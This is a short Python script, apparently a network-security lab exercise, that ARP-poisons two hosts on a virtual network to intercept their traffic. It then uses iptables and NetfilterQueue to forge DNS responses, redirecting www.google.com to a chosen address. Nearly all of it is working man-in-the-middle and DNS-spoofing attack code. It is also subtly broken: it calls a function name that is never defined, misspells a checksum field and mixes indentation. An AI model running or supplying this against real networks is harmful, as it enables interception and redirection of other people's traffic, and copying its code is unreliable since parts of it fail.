from scapy.all import * 

#Arp poisoing M1
macAttacker = "08:00:27:D0:25:4B"            
ipAttacker = "192.168.56.103"

macVictim = "08:00:27:B7:C4:AF"
ipVictim = "192.168.56.101"

ipToSpoof = "192.168.56.102"


arp= Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker           # fill the gaps
arp[ARP].psrc = ipToSpoof            # fill the gaps
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim           # fill the gaps

sendp(arp,# inter = 60, loop = 1,
loop=0, iface="enp0s3") # inter -> 60 sec to wait between 2 pkts 

# arp poisoning of M2
macAttacker = "08:00:27:D0:25:4B"            
ipAttacker = "192.168.56.103"

macVictim = "08:00:27:CC:08:6F"
ipVictim = "192.168.56.102"

ipToSpoof = "192.168.56.101"

arp= Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker           # fill the gaps
arp[ARP].psrc = ipToSpoof            # fill the gaps
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim           # fill the gaps

sendp(arp,# inter = 60, loop = 1,
loop=0, iface="enp0s3")



from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    "www.google.com": "192.168.56.102" #b???
}

def processPkt(packet):
   scapyPkt = IP(packet.get_payload())
   if scapyPkt.haslayer(DNSRR):
	print("Before ", scapyPkt.summary())
   	try:
	    scapyPkt = modify_packet(scapyPkt)
	except IndexError:
	    print ("Error")
	    pass
	print("After ", scapyPkt.summary())
	packet.set_payload(bytes(scapyPkt))

   packet.accept()

def modifyPkt(packet):
    dnsname = packet[DNSQR].qname
    if dnsname not in dns_hosts:
	print("no modification", dnsname)
	return packet
    packet[DNS].an = DNSRR(rrname=dnsname, rdata = dns_hosts[dnsname])
    packet[DNS].ancount = 1 #???
    del packet[IP].len
    del packet[IP].chsum
    del packet[UDP].len    
    del packet[UDP].chksum
    return packet


queueNum = 0
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queueNum))
queue = NetfilterQueue()
#iptable is a firewall rules
try:
    queue.bind(queueNum, processPkt)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
